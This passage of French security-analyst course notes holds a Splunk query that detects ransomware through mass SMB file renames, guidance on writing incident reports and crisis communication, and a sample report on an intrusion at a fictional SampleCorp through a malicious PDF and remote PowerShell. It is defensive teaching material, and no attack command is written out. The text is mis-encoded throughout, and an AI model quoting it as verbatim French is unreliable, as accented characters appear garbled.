Agr√©gation des r√©sultats : V√©rifie si les actions FILEOPEN et FILERENAME sont pr√©sentes dans les 100 premi√®res occurrences, ce qui peut indiquer un comportement de ransomware.

2. D√©tection du renommage excessif de fichiers avec de nouvelles extensions

Les ransomwares ont souvent pour habitude de renommer les fichiers en leur ajoutant des extensions uniques pour indiquer qu'ils ont √©t√© chiffr√©s.
Requ√™te Splunk

index="ransomwarenewfileextensionctblocker" sourcetype="bro:smbfiles:json" action="SMB::FILERENAME" 
| bin time span=5m
| rex field="name" "\.(?&lt;newfilenameextension&gt;[^\.]$)"
| rex field="prevname" "\.(?&lt;oldfilenameextension&gt;[^\.]$)"
| stats count by time, id.origh, id.respp, name, source, oldfilenameextension, newfilenameextension
| where newfilenameextension!=oldfilenameextension
| stats count by time, id.origh, id.respp, source, newfilenameextension
| where count&gt;20
| sort -count
Explication de la requ√™te
Filtrage par action et temps : Limite les r√©sultats aux √©v√©nements de renommage de fichiers dans des fen√™tres de 5 minutes.
Extraction des extensions : Utilise des expressions r√©guli√®res pour extraire les extensions des fichiers avant et apr√®s le renommage.
Filtrage des changements d'extension : Conserve uniquement les √©v√©nements o√π l'extension du fichier a chang√©.
Agr√©gation des r√©sultats : Compte les occurrences des nouveaux noms de fichiers par source et newfilenameextension.
D√©tection de ransomware : Identifie les cas o√π plus de 20 fichiers ont √©t√© renomm√©s avec la m√™me nouvelle extension dans un intervalle de 5 minutes.

Ressources suppl√©mentaires pour la d√©tection des ransomwares

Ces ressources peuvent fournir des informations utiles pour d√©tecter les ransomwares en se basant sur les extensions de fichiers et les motifs de noms connus :
[Ransomware Extensions Spreadsheet](https://docs.google.com/spreadsheets/d/e/2PACX-1vRCVzG9JCzak3hNqqrVCTQQIzH0ty77BWiLEbDu-q9oxkhAamqnlYgtQ4gF85pF6j6g3GmQxivuvO1U/pubhtml)
[Corelight‚Äôs Detect-Ransomware-Filenames Repository](https://github.com/corelight/detect-ransomware-filenames)
[Experiant‚Äôs FSRM Ransomware Extensions](https://fsrm.experiant.ca/)</code></pre></div></details></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Security Incident Reporting</strong></summary><div class="indented"><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Incident Reporting Process</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-802b-9909-da62f0bbea42"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Aper√ßu

Le rapport d'incident de s√©curit√© est essentiel dans le paysage technologique actuel pour prot√©ger les actifs organisationnels et r√©pondre efficacement aux menaces. Ce processus permet de documenter les incidents, d'apprendre des √©v√©nements pass√©s et d'am√©liorer les capacit√©s de r√©ponse futures.
Importance

Le rapport d'incident :
Relie la d√©tection √† l'att√©nuation.
Cr√©e un r√©f√©rentiel des le√ßons tir√©es.
Informe l'√©valuation des risques, la conformit√© et la sensibilisation des parties prenantes.
Identification et Cat√©gorisation des Incidents
Sources principales :
Outils de s√©curit√© : IDS, IPS, EDR, XDR, SIEM, antivirus, donn√©es NetFlow.
Observation humaine : Rapports d'employ√©s concernant des activit√©s inhabituelles.
Notifications de tiers : Alertes provenant de partenaires, fournisseurs ou clients.
Types d'incidents :
Malware : Virus, ransomware.
Phishing : Tentatives de vol de donn√©es sensibles.
DDoS : Attaques par saturation pour perturber les services.
Acc√®s non autoris√© : Entr√©e non autoris√©e dans les syst√®mes ou donn√©es.
Fuite de donn√©es : Exposition accidentelle de donn√©es.
Breach physique : Acc√®s physique non autoris√©.
Niveaux de s√©v√©rit√© :
Critique (P1) : Risque imm√©diat pour les fonctions principales, n√©cessite une action urgente.
√âlev√© (P2) : Risque important, n√©cessite une attention rapide.
Moyenne (P3) : Risque mod√©r√©, une r√©ponse en temps utile est conseill√©e.
Faible (P4) : Probl√®mes mineurs, peuvent √™tre g√©r√©s dans les op√©rations quotidiennes.
Processus de Rapport d'Incident
D√©tection et reconnaissance : Identification initiale, souvent par des alertes automatis√©es ou des observations humaines.
Analyse pr√©liminaire : √âvaluer la port√©e et l'impact potentiel ; cat√©goriser l'incident.
Enregistrement de l'incident : Documenter tous les d√©tails. Utiliser des outils comme JIRA, TheHive ou des alternatives plus simples.
Notification :
Interne : Informer les √©quipes IT, juridiques, PR et ex√©cutives.
Externe : Si n√©cessaire, notifier les clients, partenaires, autorit√©s r√©glementaires ou le public.
Investigation et rapport d√©taill√© : R√©aliser une analyse approfondie de l'incident.
Cr√©ation du rapport final : Fournir un rapport complet aux parties prenantes, d√©taillant l'incident, ses causes et les mesures correctives.
Boucle de r√©troaction : Analyse post-incident pour am√©liorer la pr√©paration √† la r√©ponse.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Elements of a Proper Incident Report</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-80fd-9a18-c1a724e76916"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">R√©sum√© Ex√©cutif

Le r√©sum√© ex√©cutif sert de point d'entr√©e accessible √† un large public, y compris aux parties prenantes non techniques. Cette section fournit une vue d'ensemble concise, les principaux r√©sultats, les actions imm√©diates prises et l'impact sur les parties prenantes. De nombreuses parties prenantes ne liront que cette section, il est donc essentiel d'assurer une grande clart√©.
Section  |  Description
ID de l'incident : Identifiant unique de l'incident.
Vue d'ensemble de l'incident : R√©sum√© des √©v√©nements de l'incident (y compris la d√©tection initiale) et du type d'attaque (par exemple, ransomware, violation de donn√©es). Inclure l'heure estim√©e, la dur√©e, les syst√®mes/donn√©es affect√©s et l'√©tat (en cours, r√©solu ou escalad√©).
Principaux r√©sultats : R√©sum√© de la cause principale et des vuln√©rabilit√©s sp√©cifiques exploit√©es. Mentionner les donn√©es compromises ou exfiltr√©es.
Actions imm√©diates prises : D√©tail des actions prises, comme l'isolement des syst√®mes, l'identification de la cause principale et l'engagement des services tiers.
Impact sur les parties prenantes : √âvaluer l'impact sur les clients, les employ√©s, les informations propri√©taires et les cons√©quences financi√®res potentielles.
Analyse Technique

Analyse approfondie des √©v√©nements techniques pendant l'incident. Cette section devrait couvrir :
Syst√®mes et Donn√©es Affect√©s
Lister tous les syst√®mes compromis ou potentiellement accessibles. Si des donn√©es ont √©t√© exfiltr√©es, sp√©cifier la quantit√©.
Sources de Preuves et Analyse
Inclure toutes les preuves analys√©es et la m√©thodologie (par exemple, les journaux d'acc√®s Web). Mettre l'accent sur l'int√©grit√© des preuves avec des hachages lorsque n√©cessaire.
Indicateurs de Compromission (IoC)
Fournir les IoC (par exemple, processus inhabituels, trafic sortant) pour la recherche de menaces ou l'attribution √† des acteurs de menace sp√©cifiques.
Analyse de la Cause Racine
Explication d√©taill√©e des vuln√©rabilit√©s exploit√©es, des causes profondes et des points de d√©faillance.
Chronologie Technique

Documenter les √©v√©nements cl√©s, y compris :
Reconnaissance
Compromission initiale
Communications C2
√ânum√©ration, mouvement lat√©ral
Acc√®s et exfiltration de donn√©es
D√©ploiement de malwares (Injection de processus, persistance)
Temps de confinement, d'√©radication et de r√©cup√©ration
Nature de l'attaque
Explication du type d'attaque, des TTP (tactiques, techniques et proc√©dures) utilis√©es par l'attaquant.
Analyse de l'Impact

√âvaluer les effets n√©gatifs sur les donn√©es, les op√©rations et la r√©putation. Cela inclut la quantification et la qualification des dommages, les implications pour l'entreprise (par exemple, pertes financi√®res), les p√©nalit√©s r√©glementaires et les impacts sur la r√©putation.
Analyse de la R√©ponse et de la R√©cup√©ration
Actions Imm√©diates de R√©ponse

R√©vocation d'acc√®s
Comptes/Syst√®mes compromis identifi√©s : D√©tail des outils et m√©thodes utilis√©s pour identifier les entit√©s compromises.
Cadre temporel : Horodatage pr√©cis de la d√©tection et de la r√©vocation.
M√©thode de r√©vocation : Explication des m√©thodes de r√©vocation (par exemple, d√©sactivation des comptes, modification des r√®gles du pare-feu).
Impact : Pr√©vention de toute autre compromission ou exfiltration.

Strat√©gie de Confinement
Confinement √† court terme : Isolement des syst√®mes affect√©s du r√©seau.
Confinement √† long terme : Mesures strat√©giques comme la segmentation ou la mise en ≈ìuvre de la s√©curit√© zero-trust.
Efficacit√© : √âvaluation des mesures de confinement.
Mesures d'√âradication

Suppression de Malware
Identification : Proc√©dures utilis√©es pour d√©tecter le malware, y compris les outils EDR ou l'analyse forensic.
Techniques de suppression : Outils sp√©cifiques ou m√©thodes manuelles utilis√©es.
V√©rification : √âtapes pour assurer la suppression compl√®te, comme la v√©rification des sommes de contr√¥le.

Patching du Syst√®me
Identification des vuln√©rabilit√©s : M√©thodes de d√©couverte des vuln√©rabilit√©s (par exemple, CVEs).
Gestion des patches : √âtapes pour tester, d√©ployer et v√©rifier les patches.
Proc√©dures de retour en arri√®re : Proc√©dures en cas d'instabilit√© apr√®s d√©ploiement.
√âtapes de R√©cup√©ration

Restauration des donn√©es
Validation des sauvegardes : Proc√©dures pour confirmer l'int√©grit√© des sauvegardes.
Processus de restauration : √âtapes d√©taill√©es pour la r√©cup√©ration des donn√©es.
V√©rifications de l'int√©grit√© des donn√©es : V√©rification de l'exactitude des donn√©es restaur√©es.

Validation du syst√®me
Mesures de s√©curit√© : Assurer la s√©curit√© du syst√®me par la reconfiguration ou la mise √† jour des IDS.
Contr√¥les op√©rationnels : V√©rification que les syst√®mes fonctionnent comme pr√©vu.
Actions Post-Incident
Surveillance
Plans de surveillance am√©lior√©s : Plans d√©taill√©s pour la surveillance future afin de d√©tecter des vuln√©rabilit√©s similaires.
Outils et technologies : Outils sp√©cifiques int√©gr√©s dans la strat√©gie de surveillance.
Le√ßons Tir√©es
Analyse des lacunes : √âvaluation des mesures de s√©curit√© √©chou√©es.
Recommandations pour l'am√©lioration : √âtapes concr√®tes pour renforcer les d√©fenses.
Strat√©gie future : Changements √† long terme dans la politique, l'architecture ou la formation.
Diagrammes

Utiliser des visuels pour simplifier les complexit√©s de l'incident :
Diagramme de flux de l'incident : Progression de l'attaque du point d'entr√©e √† la propagation du r√©seau.
Carte des syst√®mes affect√©s : Topologie r√©seau mettant en √©vidence les n≈ìuds compromis.
Diagramme du vecteur d'attaque : Diagramme du mouvement de l'attaquant et de son chemin d'exploitation.
Annexes

Fournit un contexte suppl√©mentaire, des preuves ou des d√©tails techniques. Cette section sert de base pour la v√©rification et ajoute de la profondeur au r√©cit principal du rapport.

Les contenus peuvent inclure :
Fichiers journaux
Diagrammes du r√©seau (avant et apr√®s l'incident)
Preuves forensic (images disque, vidages de m√©moire)
Extraits de code
Liste de contr√¥le de r√©ponse √† l'incident
Archives de communication
Documents de conformit√© (NDA, formulaires r√©glementaires)
Glossaire et acronymes
Meilleures Pratiques
Analyse des causes profondes : Identifier la cause fondamentale pour √©viter une r√©p√©tition.
Partage communautaire : Partager des informations non sensibles avec la communaut√© de la s√©curit√©.
Mises √† jour r√©guli√®res : Informer les parties prenantes tout au long de la r√©ponse √† l'incident.
R√©vision externe : Faire appel √† des experts tiers pour valider les conclusions.
Conclusion

Un rapport d'incident est essentiel apr√®s un √©v√©nement de s√©curit√©, offrant une analyse approfondie de ce qui a √©chou√©, des r√©ponses efficaces et des strat√©gies pour pr√©venir des √©v√©nements similaires √† l'avenir.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Communications</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-80a5-bd1f-dc0784983012"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">La Communication Efficace en Cas de Crise de S√©curit√©

La communication efficace est indispensable lors d'une crise, en particulier lors d'un incident de s√©curit√©. Une communication transparente, coordonn√©e et bien structur√©e soutient la construction de la confiance, la conformit√© r√©glementaire et l'efficacit√© des efforts de r√©ponse.
L'Importance de la Communication Efficace

La valeur d'une communication claire lors d'un incident peut √™tre cat√©goris√©e en plusieurs domaines cl√©s :
Confiance des Parties Prenantes

La communication transparente favorise la confiance des parties prenantes. En communiquant rapidement et clairement, une organisation d√©montre sa responsabilit√©, sa transparence et son contr√¥le sur l'incident.
Coordination et Efficacit√©

Un incident de cybers√©curit√© affecte plus que l‚Äô√©quipe technique ; il a des implications plus larges au sein de l'organisation. Une communication coordonn√©e assure l'alignement entre toutes les parties prenantes, am√©liorant ainsi la rapidit√© et l'efficacit√© de la r√©ponse.
Conformit√© R√©glementaire

V√©rifiez les exigences de conformit√© sp√©cifiques √† votre organisation, qui devraient √™tre document√©es dans le Plan de R√©ponse aux Incidents (PRI). Les directives r√©glementaires dictent souvent comment, quand et ce qui doit √™tre communiqu√© pour respecter les exigences l√©gales.
Communication Interne

Les communications internes sont cruciales pour maintenir un message coh√©rent et constant au sein de l'organisation. Cela est particuli√®rement important pour √©viter les fuites et la d√©sinformation. Les √©l√©ments cl√©s des communications internes comprennent :
Notification Imm√©diate : Informer rapidement toutes les parties prenantes pertinentes d√®s l'identification de l'incident.
Mises √† Jour R√©guli√®res : Partager des mises √† jour r√©guli√®res avec les √©quipes concern√©es, couvrant l'√©tat de l'incident, les impacts potentiels et les actions en cours.
Boucle de R√©troaction : √âtablir un canal de r√©troaction permettant aux √©quipes de partager leurs remarques, pr√©occupations et suggestions.
Communication Externe

Les communications externes doivent √™tre soigneusement planifi√©es, car elles concernent souvent divers tiers, allant des clients aux r√©gulateurs. Les consid√©rations importantes incluent :
Parties Affected : Communiquer directement avec les individus ou entit√©s affect√©s, comme les clients, partenaires ou fournisseurs.
D√©claration Publique : En cas d'incidents de grande envergure, envisager de publier une d√©claration publique claire et sans jargon technique pour garantir l'accessibilit√©.
Organismes de R√©gulation : Notifier les entit√©s r√©glementaires, telles que la CNIL (Commission Nationale de l'Informatique et des Libert√©s), si requis par la juridiction ou la loi, dans les d√©lais sp√©cifi√©s.
Naviguer dans les Canaux de Communication lors d‚ÄôIncidents de Cybers√©curit√©

Une communication efficace lors d‚Äôun incident de cybers√©curit√© n√©cessite des canaux s√©curis√©s et conformes. Voici un aper√ßu des consid√©rations techniques et r√©glementaires pour ces canaux.
Dimensions de S√©curit√© des Canaux de Communication
Chiffrement : Assurez-vous que toutes les communications sont s√©curis√©es avec un chiffrement de bout en bout, en particulier lors de discussions de d√©tails sensibles.
Authentification et Autorisation : Prot√©gez l'acc√®s aux canaux de communication avec une authentification multi-facteurs stricte (MFA) pour v√©rifier les identit√©s.
Int√©grit√© des Donn√©es : Utilisez des hachages cryptographiques pour garantir que les messages restent inchang√©s lors de leur transmission.
Communications √âph√©m√®res : Pour les discussions tr√®s confidentielles, envisagez l'utilisation de plateformes qui suppriment les messages apr√®s leur lecture afin de r√©duire les risques de fuites futures.
Communications Isol√©es (Air-Gapped) : Si les syst√®mes de communication principaux sont compromis, utilisez des syst√®mes isol√©s qui sont s√©par√©s des autres r√©seaux pour maintenir la s√©curit√©.
Dimensions R√©glementaires des Canaux de Communication
Lois sur la Confidentialit√© des Donn√©es : Adh√©rez aux r√©gulations sur la confidentialit√© des donn√©es, telles que le RGPD (R√®glement G√©n√©ral sur la Protection des Donn√©es), surtout lorsqu'il s'agit de donn√©es personnelles, pour assurer la conformit√©.
Mandats de Notification des Violations : Suivez les d√©lais et les lignes directrices sp√©cifiques √† chaque juridiction concernant la notification des parties prenantes en cas de violation des donn√©es.
Conservation des Documents : Trouvez un √©quilibre entre la messagerie √©ph√©m√®re et les exigences de conservation des documents, car certaines r√©gulations imposent de conserver les communications li√©es √† l'incident.
Communications Transfrontali√®res : Soyez conscient des lois sur la souverainet√© des donn√©es qui peuvent affecter les protocoles de communication et le stockage des donn√©es si l'incident concerne plusieurs juridictions.
Cha√Æne de Custodie : Maintenez une cha√Æne de custodie ininterrompue pour toutes les communications si des proc√©dures l√©gales sont anticip√©es, afin de garantir que les preuves restent recevables en justice.
Conclusion

La communication efficace est un composant critique de la r√©ponse aux incidents, reliant la coordination interne et les exigences r√©glementaires. En mettant en ≈ìuvre des strat√©gies de communication s√©curis√©es, bien planifi√©es et conformes, les organisations peuvent renforcer leur r√©silience et r√©pondre plus efficacement aux incidents de s√©curit√©.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Real-world Incident Report</strong></summary><div class="indented"><figure class="block-color-gray_background callout" id="1ea25200-7eb4-80bf-898e-deefa4259e07" style="white-space:pre-wrap;display:flex"><div style="font-size:1.5em"><span class="icon"></span></div><div style="width:100%"><p class="" id="1ea25200-7eb4-8054-9cb3-fd7028a3d734"><strong>R√©sum√© Ex√©cutif</strong></p><ul class="bulleted-list" id="1ea25200-7eb4-8041-b7cc-c71bd2b1a3ce"><li style="list-style-type:disc"><strong>ID de l'incident :</strong> INC2019-0422-022</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-8076-9087-f3a48135ba06"><li style="list-style-type:disc"><strong>Gravit√© de l'incident :</strong> √âlev√©e (P2)</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-808b-bba2-f77f5bf610b3"><li style="list-style-type:disc"><strong>Statut de l‚Äôincident :</strong> R√©solu</li></ul><p class="" id="1ea25200-7eb4-80cc-87bd-e710c9e6e55e"><strong>Aper√ßu de l'incident :</strong></p><p class="" id="1ea25200-7eb4-80b7-9c4c-f989f68c81da">Dans la nuit du 22 avril 2019 √† 01:05:00, le Centre des Op√©rations de S√©curit√© (SOC) de SampleCorp a d√©tect√© une activit√© non autoris√©e sur le r√©seau interne. Celle-ci s‚Äôest manifest√©e par le lancement de processus anormaux et des commandes PowerShell suspectes. Profitant d‚Äôun manque de contr√¥les d‚Äôacc√®s r√©seau robustes et de deux vuln√©rabilit√©s de s√©curit√©, un acteur malveillant est parvenu √† prendre le contr√¥le des n≈ìuds suivants de l‚Äôinfrastructure de SampleCorp :</p><ul class="bulleted-list" id="1ea25200-7eb4-80f5-9047-cb6f24222a6d"><li style="list-style-type:disc"><strong>WKST01.samplecorp.com</strong> : syst√®me utilis√© pour le d√©veloppement logiciel.</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-80d6-bfb5-f49aa1fc1f52"><li style="list-style-type:disc"><strong>HR01.samplecorp.com</strong> : syst√®me d√©di√© au traitement des donn√©es des employ√©s et partenaires.</li></ul><p class="" id="1ea25200-7eb4-80e6-a361-d250ed042eba">Le SOC de SampleCorp, en collaboration avec les √©quipes de R√©ponse aux Incidents et d‚ÄôInvestigation Num√©rique (DFIR), a pu contenir la menace, supprimer les logiciels malveillants et corriger les failles de s√©curit√©. Les syst√®mes compromis ont √©t√© restaur√©s dans leur √©tat initial.</p><p class="" id="1ea25200-7eb4-8046-bf5a-ef39c95673e5"><strong>Constats cl√©s :</strong></p><p class="" id="1ea25200-7eb4-8094-8e50-ea42e0e04352">L‚Äôintrus a pu obtenir une adresse IP interne en connectant simplement son ordinateur √† un port Ethernet dans un bureau de SampleCorp, en raison de contr√¥les d‚Äôacc√®s r√©seau insuffisants. L‚Äôenqu√™te a r√©v√©l√© que l‚Äôentit√© malveillante a initialement compromis <strong>WKST01.samplecorp.com</strong> via une version vuln√©rable d‚ÄôAcrobat Reader, puis a exploit√© une vuln√©rabilit√© de type "buffer overflow" dans une application propri√©taire d√©velopp√©e par SampleCorp pour √©tendre son acc√®s. Aucune fuite massive de donn√©es n‚Äôa √©t√© d√©tect√©e, probablement gr√¢ce √† l‚Äôintervention rapide du SOC et des √©quipes DFIR. Toutefois, l‚Äôacc√®s non autoris√© √† <strong>WKST01</strong> et <strong>HR01</strong> implique que les donn√©es internes et client doivent √™tre consid√©r√©es comme potentiellement compromises.</p><p class="" id="1ea25200-7eb4-80fb-b540-c975e76ced87"><strong>Actions imm√©diates :</strong></p><p class="" id="1ea25200-7eb4-801b-8675-cfb87fff00b7">Les √©quipes SOC et DFIR internes ont g√©r√© l‚Äôincident sans faire appel √† des prestataires externes. Les syst√®mes compromis ont √©t√© isol√©s par segmentation VLAN. Pour mener une enqu√™te approfondie, un ensemble de donn√©es a √©t√© collect√©, incluant des captures du trafic r√©seau. Tous les syst√®mes affect√©s ont √©t√© raccord√©s √† une solution de s√©curit√© h√¥te, et les journaux d‚Äô√©v√©nements ont √©t√© collect√©s automatiquement via la solution Elastic SIEM existante.</p><p class="" id="1ea25200-7eb4-801c-82dd-c2ea63b1d8e6"><strong>Impact sur les parties prenantes :</strong></p><ul class="bulleted-list" id="1ea25200-7eb4-8056-873c-f6ee19954fb6"><li style="list-style-type:disc"><strong>Clients :</strong><p class="" id="1ea25200-7eb4-80b3-b18a-e787bac309e4">Bien qu‚Äôaucune exfiltration massive n‚Äôait √©t√© d√©tect√©e, l‚Äôacc√®s non autoris√© aux syst√®mes susmentionn√©s soul√®ve des inqui√©tudes quant √† l‚Äôint√©grit√© et √† la confidentialit√© des donn√©es clients. Par mesure de pr√©caution, certains services ont √©t√© temporairement mis hors ligne et des cl√©s API ont √©t√© r√©voqu√©es, entra√Ænant de courtes p√©riodes d‚Äôindisponibilit√©. L‚Äôimpact financier de cette interruption est en cours d‚Äô√©valuation, avec un risque potentiel de perte de revenus et de confiance client.</p></li></ul><ul class="bulleted-list" id="1ea25200-7eb4-80ee-994b-ca0b3512ce5c"><li style="list-style-type:disc"><strong>Employ√©s :</strong><p class="" id="1ea25200-7eb4-80ce-a998-c4d8fc3d287f">Le syst√®me <strong>HR01.samplecorp.com</strong>, contenant des donn√©es sensibles sur les employ√©s, a √©t√© compromis. Bien qu‚Äôaucune preuve d‚Äôune extraction cibl√©e des donn√©es n‚Äôait √©t√© trouv√©e, le risque demeure. Les employ√©s pourraient √™tre expos√©s √† des tentatives de vol d‚Äôidentit√© ou de phishing.</p></li></ul><ul class="bulleted-list" id="1ea25200-7eb4-80c4-8387-ef23fe1cc5fc"><li style="list-style-type:disc"><strong>Partenaires commerciaux :</strong><p class="" id="1ea25200-7eb4-8008-a4b8-f28bddf97a1b">L‚Äôacc√®s √† <strong>WKST01.samplecorp.com</strong>, un environnement de d√©veloppement, laisse supposer que du code propri√©taire ou des technologies confidentielles pourraient avoir √©t√© expos√©s. Cela peut impacter la confiance des partenaires commerciaux dans l‚Äôexclusivit√© des solutions technologiques de SampleCorp.</p></li></ul><ul class="bulleted-list" id="1ea25200-7eb4-80ad-8bc0-e1a768c15a06"><li style="list-style-type:disc"><strong>Organismes de r√©gulation :</strong><p class="" id="1ea25200-7eb4-80ea-8c1b-e41550f666eb">Cette faille de s√©curit√© peut entra√Æner des cons√©quences r√©glementaires. Selon les juridictions concern√©es et la nature des donn√©es compromises, des amendes ou sanctions pourraient √™tre inflig√©es √† SampleCorp pour manquement √† la protection des donn√©es sensibles.</p></li></ul><ul class="bulleted-list" id="1ea25200-7eb4-8052-a4ef-e024b03e6122"><li style="list-style-type:disc"><strong>√âquipes internes :</strong><p class="" id="1ea25200-7eb4-8071-8734-daaf17450108">Bien que les √©quipes SOC et DFIR aient efficacement contenu l‚Äôincident, celui-ci n√©cessitera probablement une r√©vision voire une refonte des mesures de s√©curit√© existantes. Cela pourrait entra√Æner une r√©allocation des ressources et des ajustements budg√©taires, affectant d‚Äôautres projets ou d√©partements.</p></li></ul><ul class="bulleted-list" id="1ea25200-7eb4-806a-855a-e4debc2a8b7a"><li style="list-style-type:disc"><strong>Actionnaires :</strong><p class="" id="1ea25200-7eb4-8094-8da5-c706bf395041">√Ä court terme, l‚Äôincident pourrait affecter n√©gativement le cours de l‚Äôaction en raison d‚Äôune possible perte de confiance des clients et de potentielles sanctions. √Ä long terme, les impacts d√©pendront de l‚Äôefficacit√© des mesures correctives mises en place et de la capacit√© de l‚Äôentreprise √† restaurer la confiance des parties prenantes.</p></li></ul><p class="" id="1ea25200-7eb4-8048-be9c-e5b74fd3ca23"><strong>Analyse Technique</strong></p><p class="" id="1ea25200-7eb4-8076-afa7-c76e7c241ac4"><strong>Syst√®mes et Donn√©es Affect√©s</strong></p><p class="" id="1ea25200-7eb4-8031-96c2-e7e77f07c030">En raison d‚Äôun manque de contr√¥les d‚Äôacc√®s r√©seau efficaces, un individu non autoris√© a pu obtenir une adresse IP interne simplement en connectant son ordinateur √† un port Ethernet dans les locaux de SampleCorp.</p><p class="" id="1ea25200-7eb4-8050-8fd2-c973421a1595">L‚Äôentit√© malveillante est parvenue √† prendre le contr√¥le des syst√®mes suivants au sein de l‚Äôinfrastructure de SampleCorp :</p><ul class="bulleted-list" id="1ea25200-7eb4-80fe-9587-f7a800ee38d1"><li style="list-style-type:disc"><strong>WKST01.samplecorp.com</strong> : Environnement de d√©veloppement contenant du code source propri√©taire destin√© √† de futures versions logicielles, ainsi que des cl√©s API pour des services tiers. L‚Äôanalyse des acc√®s montre que l‚Äôintrus a parcouru plusieurs r√©pertoires, ce qui soul√®ve des inqui√©tudes quant √† un √©ventuel vol de propri√©t√© intellectuelle et √† une utilisation abusive des cl√©s API.</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-8050-b94b-d26e06fc021c"><li style="list-style-type:disc"><strong>HR01.samplecorp.com</strong> : Syst√®me de gestion des ressources humaines contenant des donn√©es sensibles relatives aux employ√©s et partenaires : informations personnelles, donn√©es de paie et √©valuations de performance. Les journaux d‚Äôactivit√© confirment un acc√®s non autoris√© √† ce syst√®me. Le point le plus pr√©occupant est l‚Äôacc√®s √† une base de donn√©es non chiffr√©e contenant les num√©ros de s√©curit√© sociale et les coordonn√©es bancaires des employ√©s. Bien qu‚Äôaucune preuve d‚Äôexfiltration n‚Äôait √©t√© d√©tect√©e, le risque potentiel de vol d‚Äôidentit√© et de fraude financi√®re est jug√© √©lev√©.</li></ul><p class="" id="1ea25200-7eb4-80f8-abdb-f2b7a41d4802"><strong>Sources et Analyse des Preuves</strong></p><p class="" id="1ea25200-7eb4-8048-8e70-cc488a385209"><strong>WKST01.samplecorp.com</strong></p><p class="" id="1ea25200-7eb4-804e-bff7-c3ecb2c8f02b">Dans la nuit du 22 avril 2019, √† 01:05:00 pr√©cises, le Centre des Op√©rations de S√©curit√© (SOC) de SampleCorp a d√©tect√© une activit√© anormale sur le r√©seau interne. Cette alerte a √©t√© d√©clench√©e par l‚Äôobservation de relations inhabituelles entre processus parent-enfant et l‚Äôex√©cution de commandes PowerShell suspectes, comme illustr√© dans une capture d‚Äô√©cran interne.</p><p class="" id="1ea25200-7eb4-8003-bc74-fcca3012f037">L‚Äôanalyse des journaux r√©v√®le que PowerShell a √©t√© invoqu√© via <strong>cmd.exe</strong> pour ex√©cuter le contenu d‚Äôun script h√©berg√© √† distance. L‚Äôadresse IP du serveur distant √©tait <strong>192.168.220.66</strong>, une adresse interne, ce qui indique que l‚Äôentit√© malveillante avait d√©j√† p√©n√©tr√© le r√©seau interne avant l‚Äôex√©cution du script.<br/><br/></p><p class="" id="1ea25200-7eb4-80b5-ab60-d7ceb7aada52">
</p><figure class="image" id="1ea25200-7eb4-80d9-a9ad-d378fdf604cb"><a href="image%206.png"><img src="image%206.png" style="width:643.984375px"/></a></figure><p class="" id="1ea25200-7eb4-8034-a03d-d79673cd1176">Les premiers signes d'ex√©cution de commandes malveillantes indiquent que <strong>WKST01.samplecorp.com</strong> a probablement √©t√© compromis suite √† l'ouverture d'une pi√®ce jointe suspecte dans un e-mail, nomm√©e <strong>cv.pdf</strong>, et ce pour les raisons suivantes :</p><ul class="bulleted-list" id="1ea25200-7eb4-8094-a606-c496214c94a9"><li style="list-style-type:disc">L'utilisateur a acc√©d√© √† sa messagerie via le client <strong>Mozilla Thunderbird</strong>.</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-8025-8979-df658d34e45b"><li style="list-style-type:disc">Le fichier <strong>cv.pdf</strong>, jug√© suspect, a √©t√© ouvert avec <strong>Adobe Reader 10.0</strong>, une version obsol√®te pr√©sentant des vuln√©rabilit√©s connues.</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-80a9-b11f-f806947ffa18"><li style="list-style-type:disc">Des commandes malveillantes ont √©t√© enregistr√©es imm√©diatement apr√®s ces actions, sugg√©rant un lien direct avec l‚Äôouverture du fichier.<figure class="image" id="1ea25200-7eb4-80b6-9a93-f01eca0e3e51"><a href="image%207.png"><img src="image%207.png" style="width:615.984375px"/></a></figure><p class="" id="1ea25200-7eb4-8089-ada5-d19074cf1197">
</p><p class="" id="1ea25200-7eb4-8063-8e7e-e59a6cc6f546">De plus, cmd.exe et powershell.exe ont √©t√© g√©n√©r√©s √† partir de wmiprvse.exe.</p><figure class="image" id="1ea25200-7eb4-801c-b264-c52a7990b7b3"><a href="image%208.png"><img src="image%208.png" style="width:615.984375px"/></a></figure><figure class="image" id="1ea25200-7eb4-8040-877d-d7402e067269"><a href="image%209.png"><img src="image%209.png" style="width:615.96875px"/></a></figure><p class="" id="1ea25200-7eb4-8057-9377-d1d0345a97b2">Comme d√©j√† mentionn√©, l‚Äôentit√© non autoris√©e a ensuite ex√©cut√© des commandes PowerShell sp√©cifiques.</p><figure class="image" id="1ea25200-7eb4-8054-a52c-eb488da17b61"><a href="image%2010.png"><img src="image%2010.png" style="width:615.984375px"/></a></figure><p class="" id="1ea25200-7eb4-8084-a835-cb552e037b53"><strong>Analyse succincte de l‚Äôadresse IP 192.168.220.66</strong></p><p class="" id="1ea25200-7eb4-8070-826e-dbaafedb1f89">L‚Äôanalyse des journaux a permis d‚Äôidentifier quatre h√¥tes actifs sur le segment r√©seau, chacun associ√© √† une adresse IP et un nom de machine. L‚Äôh√¥te <strong>192.168.220.66</strong>, pr√©c√©demment rep√©r√© dans les journaux de <strong>WKST01.samplecorp.com</strong>, confirme la pr√©sence d‚Äôun acteur non autoris√© au sein du r√©seau interne.</p><table class="simple-table" id="1ea25200-7eb4-8012-a942-e3cef02faaab"><tbody><tr id="1ea25200-7eb4-80d4-9d11-cd9e802ac7b4"><td class="" id="?SjM">Adresse IP</td><td class="" id="We&lt;A">Nom d‚Äôh√¥te</td></tr><tr 